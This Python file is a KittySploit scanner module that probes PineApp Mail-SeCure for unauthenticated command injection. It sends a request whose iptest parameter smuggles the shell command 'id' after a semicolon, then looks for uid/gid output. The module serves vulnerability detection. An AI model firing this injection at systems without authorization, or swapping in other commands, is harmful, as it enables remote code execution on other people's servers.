#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""PineApp Mail-SeCure test_li_connection.php command injection."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'PineApp Mail-SeCure - test_li_connection.php RCE Detection',
        'description': (
            'Detects PineApp Mail-SeCure RCE via '
            '/admin/test_li_connection.php?iptest=127.0.0.1;id.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'pineapp', 'rce', 'cmdi', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'rce', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/27442',
        ],
    }

    def run(self):
        tid = ''.join(c for c in self.random_text(16) if c.isdigit())[:8] or '12345678'
        path = (
            f'/admin/test_li_connection.php?actiontest=1&idtest={tid}'
            '&iptest=127.0.0.1;id'
        )
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if r and re.search(r'uid=\d+.*gid=\d+', r.text or ''):
            self.set_info(
                severity='critical',
                reason='PineApp Mail-SeCure test_li_connection RCE',
                path='/admin/test_li_connection.php',
            )
            return True
        return False
